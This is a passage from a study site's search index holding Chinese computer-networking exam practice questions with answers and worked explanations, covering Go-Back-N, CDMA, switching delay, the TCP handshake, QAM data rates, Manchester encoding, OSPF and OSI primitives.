4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#21-mon","text":"\u6570\u636e\u94fe\u8def\u5c42\u91c7\u7528\u4e86\u540e\u9000N\u5e27(GBN)\u534f\u8bae\uff0c\u53d1\u9001\u65b9\u5df2\u7ecf\u53d1\u9001\u4e86\u7f16\u53f7\u4e3a0\uff5e7\u7684\u5e27\u3002\u5f53\u8ba1\u65f6\u5668\u8d85\u65f6\u65f6\uff0c\u82e5\u53d1\u9001\u65b9\u53ea\u6536\u52300\u30012\u30013\u53f7\u5e27\u7684\u786e\u8ba4\uff0c\u5219\u53d1\u9001\u65b9\u9700\u8981\u91cd\u53d1\u7684\u5e27\u6570\u662f\u3002[\u5357\u4eac\u5927\u5b66] A\uff0e2 B\uff0e3 C\uff0e4 D\uff0e5 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u6839\u636e\u540e\u9000N\u5e27\u534f\u8bae\uff0c\u5f53\u63a5\u6536\u65b9\u68c0\u6d4b\u51fa\u5931\u5e8f\u7684\u4fe1\u606f\u5e27\u540e\uff0c\u8981\u6c42\u53d1\u9001 \u65b9\u91cd\u53d1\u6700\u540e\u4e00\u4e2a\u6b63\u786e\u63a5\u6536\u7684\u4fe1\u606f\u5e27\u4e4b\u540e\u7684\u6240\u6709\u672a\u88ab\u786e\u8ba4\u7684\u5e27\uff1b\u6216\u8005\u5f53\u53d1\u9001\u65b9\u53d1\u9001\u4e86N\u4e2a\u5e27\u540e\uff0c\u82e5\u53d1\u73b0\u8be5N\u5e27\u7684 \u524d\u4e00\u4e2a\u5e27\u5728\u8ba1\u65f6\u5668\u8d85\u65f6\u540e\u4ecd\u672a\u8fd4\u56de\u5176\u786e\u8ba4\u4fe1\u606f\uff0c\u5219\u8be5\u5e27\u88ab\u5224\u4e3a\u51fa\u9519\u6216\u4e22\u5931,\u6b64\u65f6\u53d1\u9001\u65b9\u5c31\u4e0d\u5f97\u4e0d\u91cd\u65b0\u53d1\u9001\u51fa\u9519\u5e27 \u53ca\u5176\u540e\u7684N\u5e27\u3002\u672c\u9898\u6536\u52303\u53f7\u5e27\u7684\u786e\u8ba4\uff0c\u8bf4\u660e0, 1, 2, 3\u53f7\u5e27\u5df2\u7ecf\u6536\u5230\uff0c\u4e22\u5931\u7684\u662f4, 5, 6, 7\u53f7\u5e27\uff0c\u51714\u5e27\u3002\u56e0\u6b64\u7b54\u6848\u4e3aC\u9879\u3002","title":"2.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#22-tue","text":"\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u8fdb\u884c\u8f6c\u53d1\u51b3\u7b56\u65f6\u4f7f\u7528\u7684PDU\u5730\u5740\u662f \u3002[\u5357\u4eac\u5927\u5b66] A\uff0e\u76ee\u7684\u7269\u7406\u5730\u5740 B\uff0e\u76ee\u7684IP\u5730\u5740 C\uff0e\u6e90\u7269\u7406\u5730\u5740 D\uff0e\u6e90IP\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u662f\u6570\u636e\u94fe\u8def\u5c42\u8bbe\u5907\uff0c\u5b83\u7684\u8f6c\u53d1\u51b3\u7b56\u662f\u4f9d\u636ePDU\u7684\u76ee\u7684\u7269\u7406\u5730\u5740\u3002","title":"2.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#23-wed","text":"\u7ad9\u70b9A\u3001B\u3001C\u901a\u8fc7CDMA\u5171\u4eab\u94fe\u8def\uff0cA\u3001B\u3001C\u7684\u7801\u7247\u5e8f\u5217\uff08chipping sequence\uff09\u5206\u522b\u662f\uff081,1,1,1\uff09\u3001\uff081\uff0c-1,1\uff0c-1\uff09\u548c\uff081\uff0c1,-1\uff0c-1\uff09\uff0c\u82e5C\u4ece\u94fe\u8def\u4e0a\u6536\u5230\u7684\u5e8f\u5217\u662f\uff082,0,2,0,0\uff0c-2,0\uff0c-2,0,2,0,2\uff09\uff0c\u5219C\u6536\u5230A\u53d1\u9001\u7684\u6570\u636e\u662f \u3002[\u897f\u5317\u5927\u5b66] A.000 B.101 C.110 D.111 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aC\u63a5\u6536\u5230\u7684\u662fA\uff0cB\u53d1\u9001\u8fc7\u6765\u7684\u53e0\u52a0\u7801\u7247\uff0cC\u60f3\u8981\u770bA\u53d1\u9001\u7684\u6570\u636e\uff0c\u5c31\u5c06\u63a5\u6536\u5230\u7684\u53e0\u52a0\u7801\u7247\u4e0eA\u7684\u7801\u7247\u5e8f\u5217\u8fdb\u884c\u89c4\u683c\u5316\u5185\u79ef\u64cd\u4f5c\uff1a\uff082\uff0c0\uff0c2\uff0c0\uff1b0\uff0c-2\uff0c0\uff0c-2\uff1b0\uff0c2\uff0c0\uff0c2\uff09\u6bcf\u56db\u4f4d\u4e0e\uff081\uff0c1\uff0c1\uff0c1\uff09\u8fdb\u884c\u89c4\u683c\u5316\u5185\u79ef\uff0c\uff082*1+0*1+2*1+0*1)/4=1;\uff080*1+-2*1+0*1+-2*1)/4=-1\uff0c-1\u53730;\uff080*1+2*1+0*1+2*1)/4=1;\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c101\u3002","title":"2.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#24-thu","text":"\u4e3b\u673a\u7532\u901a\u8fc71\u4e2a\u8def\u7531\u5668(\u5b58\u50a8\u8f6c\u53d1\u65b9\u5f0f)\u4e0e\u4e3b\u673a\u4e59\u4e92\u8054\uff0c\u4e24\u6bb5\u94fe\u8def\u7684\u6570\u636e\u4f20\u8f93\u901f\u7387\u5747\u4e3a10Mbps\uff0c\u4e3b\u673a\u7532\u5206\u522b\u91c7\u7528\u62a5\u6587\u4ea4\u6362\u548c\u5206\u7ec4\u5927\u5c0f\u4e3a10kb\u7684\u5206\u7ec4\u4ea4\u6362\u5411\u4e3b\u673a\u4e59\u53d1\u90011\u4e2a\u5927\u5c0f\u4e3a8Mb(1M=106)\u7684\u62a5\u6587\u3002\u82e5\u5ffd\u7565\u94fe\u8def\u4f20\u64ad\u5ef6\u8fdf\u3001\u5206\u7ec4\u5934\u5f00\u9500\u548c\u5206\u7ec4\u62c6\u88c5\u65f6\u95f4\uff0c\u5219\u4e24\u79cd\u4ea4\u6362\u65b9\u5f0f\u5b8c\u6210\u8be5\u62a5\u6587\u4f20\u8f93\u6240\u9700\u7684\u603b\u65f6\u95f4\u5206\u522b\u4e3a [\u5357\u4eac\u7406\u5de5\u5927\u5b66] A\uff0e800ms\u30011600ms B\uff0e801ms\u30011600ms C\uff0e1600ms\u3001800ms D\uff0e1600ms\u3001801ms \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u4e0d\u8fdb\u884c\u5206\u7ec4\u65f6\uff0c\u53d1\u9001\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u662f8Mb/10Mb/s=800ms\uff0c\u5728\u63a5\u6536\u7aef\u63a5\u6536\u6b64\u62a5\u6587\u7684\u65f6\u5ef6\u4e5f\u662f800ms\uff0c\u5171\u8ba11600ms\u3002\u8fdb\u884c\u5206\u7ec4\u540e\uff0c\u53d1\u9001\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u662f10kb/10Mb/s=1ms\uff0c\u63a5\u6536\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u4e5f\u662f1ms\uff0c\u4f46\u662f\u5728\u53d1\u9001\u7b2c\u4e8c\u4e2a\u62a5\u6587\u65f6\uff0c\u7b2c\u4e00\u4e2a\u62a5\u6587\u5df2\u7ecf\u5f00\u59cb\u63a5\u6536\u3002\u5171\u8ba1\u6709800\u4e2a\u5206\u7ec4\uff0c\u603b\u65f6\u95f4\u4e3a801ms\u3002","title":"2.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#25-fri","text":"\u4e3b\u673a\u7532\u5411\u4e3b\u673a\u4e59\u53d1\u9001\u4e00\u4e2a(SYN\uff1d1\uff0cseq\uff1d11220)\u7684TCP\u6bb5\uff0c\u671f\u671b\u4e0e\u4e3b\u673a\u4e59\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u82e5\u4e3b\u673a\u4e59\u63a5\u53d7\u8be5\u8fde\u63a5\u8bf7\u6c42\uff0c\u5219\u4e3b\u673a\u4e59\u5411\u4e3b\u673a\u7532\u53d1\u9001\u7684\u6b63\u786e\u7684TCP\u6bb5\u53ef\u80fd\u662f [\u5357\u4eac\u7406\u5de5\u5927\u5b66] A\uff0e\uff08SYN\uff1d0\uff0cACK\uff1d0\uff0cseq\uff1d11221\uff0cack\uff1d11221\uff09 B\uff0e\uff08SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1d11220\uff0cack\uff1d11220\uff09 C\uff0e\uff08SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1d11221\uff0cack\uff1d11221\uff09 D\uff0e\uff08SYN\uff1d0\uff0cACK\uff1d0\uff0cseq\uff1d11220\uff0cack\uff1d11220\uff09 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aTCP\u662f\u9762\u5411\u8fde\u63a5\u7684\uff0c\u6240\u8c13\u9762\u5411\u8fde\u63a5\uff0c\u5c31\u662f\u5f53\u8ba1\u7b97\u673a\u53cc\u65b9\u901a\u4fe1\u65f6\u5fc5\u9700\u5148\u5efa\u7acb\u8fde\u63a5\uff0c\u7136\u540e\u6570\u636e\u4f20\u9001\uff0c\u6700\u540e\u62c6\u9664\u4e09\u4e2a\u8fc7\u7a0b\uff0c\u4e5f\u5c31\u662f\u5ba2\u6237\u4e3b\u52a8\u6253\u5f00TCP\u4f20\u8f93\uff0c\u670d\u52a1\u5668\u88ab\u52a8\u6253\u5f00\u3002 \u7b2c\u4e00\u6b21\u63e1\u624b\uff1a\u5ba2\u6237\u53d1\u9001SYN\uff1d1\uff0cseq\uff1dx\u7ed9\u670d\u52a1\u5668\uff0c\u5373\u5ba2\u6237\u7684TCP\u5411\u670d\u52a1\u5668\u53d1\u51fa\u8fde\u63a5\u8bf7\u6c42\u62a5\u6587\u6bb5\uff0c\u5176\u9996\u90e8\u4e2d\u7684\u540c\u6b65\u4f4dSYN\uff1d1\uff0c\u5e76\u9009\u62e9\u5e8f\u53f7seq\uff1dx\uff0c\u8868\u660e\u4f20\u9001\u6570\u636e\u65f6\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u5b57\u8282\u7684\u5e8f\u53f7\u662fx\u3002 \u7b2c\u4e8c\u6b21\u63e1\u624b\uff1a\u670d\u52a1\u5668\u53d1\u9001SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1dx+1\u7ed9\u5ba2\u6237\uff0c\u5373\u670d\u52a1\u5668\u7684TCP\u6536\u5230\u8fde\u63a5\u8bf7\u6c42\u62a5\u6587\u6bb5\u540e\uff0c\u5982\u540c\u610f\u5219\u53d1\u56de\u786e\u8ba4\u3002\u670d\u52a1\u5668\u5728\u786e\u8ba4\u62a5\u6587\u6bb5\u4e2d\u5e94\u4f7fSYN\uff1d1\uff0c\u4f7fACK\uff1d1\uff0c\u5176\u786e\u8ba4\u53f7ack\uff1dx+1\uff0c\u81ea\u5df1\u9009\u62e9\u7684\u5e8f\u53f7seq\uff1dy\u3002 \u7b2c\u4e09\u6b21\u63e1\u624b\uff1a\u5ba2\u6237\u53d1\u9001ACK\uff1d1\uff0cseq\uff1dx+1\uff0cack\uff1dy+1\u7ed9\u670d\u52a1\u5668\uff0c\u5373\u5ba2\u6237\u6536\u5230\u6b64\u62a5\u6587\u6bb5\u540e\u5411\u670d\u52a1\u5668\u7ed9\u51fa\u786e\u8ba4\uff0c\u5176ACK\uff1d1\uff0c\u786e\u8ba4\u53f7ack\uff1dy+1\u3002\u5ba2\u6237\u7684TCP\u901a\u77e5\u4e0a\u5c42\u5e94\u7528\u8fdb\u7a0b\uff0c\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u3002 \u670d\u52a1\u5668\u7684TCP\u6536\u5230\u4e3b\u673a\u5ba2\u6237\u7684\u786e\u8ba4\u540e\uff0c\u4e5f\u901a\u77e5\u5176\u4e0a\u5c42\u5e94\u7528\u8fdb\u7a0b\uff1aTCP\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u3002\u56e0\u6b64\uff0c\u672c\u9898\u4e2dx\uff1d11220\uff0cy\u662f\u4e3b\u673a\u4e59\u81ea\u52a8\u9009\u53d6\u7684\u5e8f\u53f7\uff0c\u53ef\u4ee5\u4e0ex\u76f8\u540c\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u76f8\u540c\uff0c\u4ece\u800c\u4e3b\u673a\u4e59\u6240\u53d1\u51fa\u7684TCP\u6bb5\u5e94\u8be5\u662fSYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1dx+1\uff0c\u5373SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1d11221\uff0c\u4ece\u800c\u7b54\u6848\u662fC\u3002","title":"2.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#26-sat","text":"\u5728\u65e0\u566a\u58f0\u60c5\u51b5\u4e0b\uff0c\u82e5\u67d0\u901a\u4fe1\u94fe\u8def\u7684\u5e26\u5bbd\u4e3a3kHz\uff0c\u91c7\u75284\u4e2a\u76f8\u4f4d\uff0c\u6bcf\u4e2a\u76f8\u4f4d\u5177\u67094\u79cd\u632f\u5e45\u7684QAM\u8c03\u5236\u6280\u672f\uff0c\u5219\u8be5\u901a\u4fe1\u94fe\u8def\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\u662f [\u5409\u6797\u5927\u5b66] A\uff0e12 kbps B\uff0e24 kbps C\uff0e48 kbps D\uff0e96 kbps \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u9996\u5148\u8981\u6839\u636e\u4fe1\u9053\u6709\u65e0\u566a\u58f0\u6765\u786e\u5b9a\u662f\u5426\u91c7\u7528\u5948\u594e\u65af\u7279\u5b9a\u7406\u3002\u89e3\u9898\u96be\u70b9\u5728\u4e8e\u79bb\u6563\u6570\u503c\u7684\u786e\u5b9a\uff0c\u5148\u786e\u5b9a\u8c03\u5236\u6280\u672f\u7684\u7801\u5143\u6570\uff0c\u6b64\u5904\u4e3a4\u4e2a\u76f8\u4f4d\u4e58\u4ee54\u79cd\u632f\u5e45\uff0c\u517116\u79cd\uff0c\u5373\u8be5\u901a\u4fe1\u94fe\u8def\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\uff1d2\u00d73\u00d7\u33d22\uff084\u00d74\uff09\uff1d6\u00d74\uff1d24kbps\u3002","title":"2.6. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#27-sun","text":"\u82e5\u4e0b\u56fe\u4e3a10 BaseT \u7f51\u5361\u63a5\u6536\u5230\u7684\u4fe1\u53f7\u6ce2\u5f62\uff0c\u5219\u8be5\u7f51\u5361\u6536\u5230\u7684\u6bd4\u7279\u4e32\u662f \u3002[\u4e2d\u5357\u5927\u5b66] A. 0011 0110 B. 1010 1101 C. 0101 0010 D. 1100 0101 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u6570\u636e\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u3002 \u7f16\u7801\u89c4\u5219\u4e3a\uff1a1.\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u9ad8\u5230\u4f4e\u8df3\u53d8\u8868\u793a\"0\"\uff08\u5373\u4e0b\u964d\u6cbf\uff09\uff0c\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u4f4e\u5230\u9ad8\u8df3\u53d8\u8868\u793a\"1\"\uff08\u5373\u4e0a\u5347\u6cbf\uff09\u3002\u6216\u80052.\u4f4d\u4e2d\u95f4 \u7535\u5e73\u4ece\u9ad8\u5230\u4f4e\u8df3\u53d8\u8868\u793a\"1\"\uff0c\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u4f4e\u5230\u9ad8\u8df3\u53d8\u8868\u793a\"0\"\u3002 \u56e0\u6b64\u7b54\u6848\u4e3a1\uff1a11001001 \u6216\u80052\uff1a00110110\u9009A\u3002","title":"2.7. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Otc # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1 1. Week 1 # \u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u94fe\u8def\u5c42\u91c7\u7528\u9000\u540e N \u5e27\u534f\u8bae\uff08GBN\uff09 \u4f20\u8f93\u6570\u636e\uff0c\u6570\u636e\u4f20\u8f93\u901f\u7387\u4e3a 16kbps\uff0c\u5355\u5411\u4f20\u64ad\u65f6\u5ef6 270ms \uff0c\u6570\u636e\u5e27\u957f\u5ea6\u8303\u56f4\u662f 128~512 \u5b57\u8282\uff0c\u63a5\u6536\u65b9\u603b\u662f\u4ee5\u4e0e\u6570\u636e\u5e27\u7b49\u957f\u7684\u5e27\u8fdb\u884c\u786e\u8ba4\u3002\u4e3a\u4f7f\u4fe1\u9053\u5229\u7528\u7387\u8fbe \u5230\u6700\u9ad8\uff0c\u5e27\u5e8f\u53f7\u7684\u6bd4\u7279\u6570\u81f3\u5c11\u4e3a [\u91cd\u5e86\u90ae\u7535\u5927\u5b66] A\uff0e5 B\uff0e4 C\uff0e3 D\uff0e2 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u672c\u9898\u4e3b\u8981\u6c42\u89e3\u7684\u662f\u4ece\u53d1\u9001\u4e00\u4e2a\u5e27\u5230\u63a5\u6536\u5230\u5bf9\u8fd9\u4e2a\u5e27\u7684\u786e\u8ba4\u4e3a\u6b62 \u7684\u65f6\u95f4\u5185\u6700\u591a\u53ef\u4ee5\u53d1\u9001\u591a\u5c11\u6570\u636e\u5e27\u3002\u8981\u5c3d\u53ef\u80fd\u591a\u53d1\u5e27\uff0c \u5e94\u4ee5\u77ed\u7684\u6570\u636e\u5e27\u8ba1\u7b97\uff0c \u56e0 \u6b64\u9996\u5148\u8ba1\u7b97\u51fa\u53d1\u9001\u4e00\u5e27\u7684\u65f6\u95f4\uff1a128*8/ \uff0816*10 3\uff09=64\uff08ms\uff09\uff1b\u53d1\u9001\u4e00\u5e27\u5230\u6536\u5230 \u786e\u8ba4\u4e3a\u6b62\u7684\u603b\u65f6\u95f4\uff1a64+270*2+64=668ms \uff1b\u8fd9\u6bb5\u65f6\u95f4\u603b\u5171\u53ef\u4ee5\u53d1\u9001 668/64=10.4 \uff08\u5e27\uff09\uff0c\u53d1\u9001\u8fd9\u4e48\u591a\u5e27\u81f3\u5c11\u9700\u8981\u7528 4 \u4f4d\u6bd4\u7279\u8fdb\u884c\u7f16\u53f7\u3002","title":"2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#2020-otc","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#1-week-1","text":"\u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u94fe\u8def\u5c42\u91c7\u7528\u9000\u540e N \u5e27\u534f\u8bae\uff08GBN\uff09 \u4f20\u8f93\u6570\u636e\uff0c\u6570\u636e\u4f20\u8f93\u901f\u7387\u4e3a 16kbps\uff0c\u5355\u5411\u4f20\u64ad\u65f6\u5ef6 270ms \uff0c\u6570\u636e\u5e27\u957f\u5ea6\u8303\u56f4\u662f 128~512 \u5b57\u8282\uff0c\u63a5\u6536\u65b9\u603b\u662f\u4ee5\u4e0e\u6570\u636e\u5e27\u7b49\u957f\u7684\u5e27\u8fdb\u884c\u786e\u8ba4\u3002\u4e3a\u4f7f\u4fe1\u9053\u5229\u7528\u7387\u8fbe \u5230\u6700\u9ad8\uff0c\u5e27\u5e8f\u53f7\u7684\u6bd4\u7279\u6570\u81f3\u5c11\u4e3a [\u91cd\u5e86\u90ae\u7535\u5927\u5b66] A\uff0e5 B\uff0e4 C\uff0e3 D\uff0e2 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u672c\u9898\u4e3b\u8981\u6c42\u89e3\u7684\u662f\u4ece\u53d1\u9001\u4e00\u4e2a\u5e27\u5230\u63a5\u6536\u5230\u5bf9\u8fd9\u4e2a\u5e27\u7684\u786e\u8ba4\u4e3a\u6b62 \u7684\u65f6\u95f4\u5185\u6700\u591a\u53ef\u4ee5\u53d1\u9001\u591a\u5c11\u6570\u636e\u5e27\u3002\u8981\u5c3d\u53ef\u80fd\u591a\u53d1\u5e27\uff0c \u5e94\u4ee5\u77ed\u7684\u6570\u636e\u5e27\u8ba1\u7b97\uff0c \u56e0 \u6b64\u9996\u5148\u8ba1\u7b97\u51fa\u53d1\u9001\u4e00\u5e27\u7684\u65f6\u95f4\uff1a128*8/ \uff0816*10 3\uff09=64\uff08ms\uff09\uff1b\u53d1\u9001\u4e00\u5e27\u5230\u6536\u5230 \u786e\u8ba4\u4e3a\u6b62\u7684\u603b\u65f6\u95f4\uff1a64+270*2+64=668ms \uff1b\u8fd9\u6bb5\u65f6\u95f4\u603b\u5171\u53ef\u4ee5\u53d1\u9001 668/64=10.4 \uff08\u5e27\uff09\uff0c\u53d1\u9001\u8fd9\u4e48\u591a\u5e27\u81f3\u5c11\u9700\u8981\u7528 4 \u4f4d\u6bd4\u7279\u8fdb\u884c\u7f16\u53f7\u3002","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Sep # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 2. Week 4 2.1. Wed 3. Week 4 3.1. Wed 3.2. Sun 1. Week 3 # 1.1. Wed # \u5f00\u653e\u6700\u77ed\u8def\u5f84\u4f18\u5148\u534f\u8bae(OSPF)\u91c7\u7528______\u7b97\u6cd5\u8ba1\u7b97\u6700\u4f73\u8def\u7531\u3002[\u897f\u5b89\u7535\u5b50\u79d1\u6280\u5927\u5b66952-2017] A\uff0eDynamic-Search B\uff0eBellman-Ford C\uff0eDijkstra D\uff0eSpanning-Tree \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aOSPF\u662f\u4e00\u79cd\u57fa\u4e8eDiikstra\u7b97\u6cd5\u7684\u94fe\u8def\u72b6\u6001\u534f\u8bae\uff0c\u8fd9\u79cd\u534f\u8bae\u8981\u6c42\u8def\u7531\u5668\u638c\u63e1\u5b8c\u6574\u7684\u7f51\u7edc\u62d3\u6251\u7ed3\u6784\uff0c\u5e76\u636e\u6b64\u8ba1\u7b97\u51fa\u5230\u8fbe\u76ee\u6807\u7684\u6700\u4f73\u8def\u7531\u3002\u8be5\u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\uff1a\u4e92\u8054\u7f51\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u5468\u671f\u6027\u5730\u5411\u5176\u4ed6\u8def\u7531\u5668\u5e7f\u64ad\u81ea\u5df1\u4e0e\u76f8\u90bb\u8def\u7531\u5668\u7684\u8fde\u63a5\u5173\u7cfb\uff0c\u5229\u7528\u5176\u4ed6\u8def\u7531\u5668\u7684\u5e7f\u64ad\u4fe1\u606f\uff0c\u4e92\u8054\u7f51\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u53ef\u4ee5\u5f62\u6210\u4e00\u5f20\u7531\u70b9\u548c\u7ebf\u8fde\u63a5\u800c\u6210\u7684\u62bd\u8c61\u62d3\u6251\u7ed3\u6784\u56fe\uff1b\u4e00\u65e6\u5f97\u5230\u4e86\u8fd9\u5f20\u56fe\uff0c\u8def\u7531\u5668\u5c31\u53ef\u4ee5\u6309\u7167Dijkstra\u7b97\u6cd5\u8ba1\u7b97\u51fa\u4ee5\u672c\u5730\u8def\u7531\u5668\u4e3a\u6839\u7684SPF\u6811\uff0c\u901a\u8fc7\u8fd9\u68f5\u6811\u8def\u7531\u5668\u5c31\u53ef\u4ee5\u751f\u6210\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002 2. Week 4 # 2.1. Wed # IS0\u4e3a\u4f20\u8f93\u5c42\u5b9a\u4e49\u4e864\u79cd\u7c7b\u578b\u7684\u670d\u52a1\u539f\u8bed\uff0c\u7531\u4f20\u8f93\u670d\u52a1\u7528\u6237\u4ea7\u751f\u7684\u539f\u8bed\u662f [\u897f\u5b89\u7535\u5b50\u79d1\u6280\u5927\u5b66952] A\uff0e\u8bf7\u6c42\u539f\u8bed\uff0c\u6307\u793a\u539f\u8bed B\uff0e\u8bf7\u6c42\u539f\u8bed\uff0c\u54cd\u5e94\u539f\u8bed C\uff0e\u6307\u793a\u539f\u8bed\uff0c\u786e\u8ba4\u539f\u8bed D\uff0e\u54cd\u5e94\u539f\u8bed\uff0c\u786e\u8ba4\u539f\u8bed \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5728OSI\u53c2\u8003\u6a21\u578b\u4e2d\uff0c4\u4e2a\u57fa\u672c\u7684\u5c42\u95f4\u670d\u52a1\u539f\u8bed\u662f\u8bf7\u6c42(Request)\u3001\u6307\u793a(Indication)\u3001\u54cd\u5e94(Response)\u548c\u8bc1\u5b9e(Confirm)\u3002 \u8bf7\u6c42(Request)\uff1a\u547c\u53eb\u8bf7\u6c42\u5efa\u7acb\u8fde\u63a5\u3002 \u6307\u793a(Indication)\uff1a\u6307\u793a\u6709\u4eba\u8bf7\u6c42\u5efa\u7acb\u8fde\u63a5\u3002 \u54cd\u5e94(Response)\uff1a\u88ab\u547c\u53eb\u65b9\u7528\u6765\u8868\u793a\u63a5\u53d7/\u62d2\u7edd\u5efa\u7acb\u8fde\u63a5\u8bf7\u6c42\u3002 \u8bc1\u5b9e(Confirm)\uff1a\u901a\u77e5\u547c\u53eb\u65b9\u5efa\u7acb\u8fde\u63a5\u8bf7\u6c42\u662f\u5426\u88ab\u63a5\u53d7\u3002 \u4f20\u8f93\u5c42\u4ea7\u751f\u7684\u539f\u8bed\u662f\u8bf7\u6c42\u548c\u54cd\u5e94\u3002 